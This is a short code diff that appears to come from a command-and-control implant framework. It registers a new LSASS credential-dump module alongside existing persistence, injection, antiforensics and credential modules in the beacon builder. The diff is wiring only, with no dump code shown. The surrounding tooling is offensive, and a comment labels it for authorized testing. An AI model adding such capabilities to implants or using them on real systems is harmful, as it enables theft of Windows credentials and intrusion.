@@ -20,11 +20,14 @@ _MODULE_FILES = {
     "obfuscation": ("obfuscation.py", "obfuscation"),
     "socks": ("socks.py", "socks"),
     "credentials": ("credentials.py", "credentials"),
+    # LSASS dump - authorized testing only; see cs/modules/lsass.py
+    "lsass": ("lsass.py", "lsass"),
 }
 # beacon handler attr name for each module
 _MOD_ATTR = {"persistence": "persist", "injection": "inject",
              "antiforensics": "af", "obfuscation": "obf", "socks": "socks",
-             "credentials": "credentials", "crypto": "crypto"}
+             "credentials": "credentials", "crypto": "crypto",
+             "lsass": "lsass"}
 
 
 def _module_source(name):
@@ -100,7 +103,7 @@ def build_standalone_beacon():
         "        Beacon._injected = _inject_modules()\n"
         "    _cmap = {'persistence':'persist','injection':'inject',"
         "'antiforensics':'af','obfuscation':'obf','socks':'socks',"
-        "'credentials':'credentials','crypto':'crypto'}\n"
+        "'credentials':'credentials','lsass':'lsass','crypto':'crypto'}\n"
         "    injected = Beacon._injected.get(_cmap.get(name, name))\n"
         "    if injected is not None:\n"
         "        return injected\n"
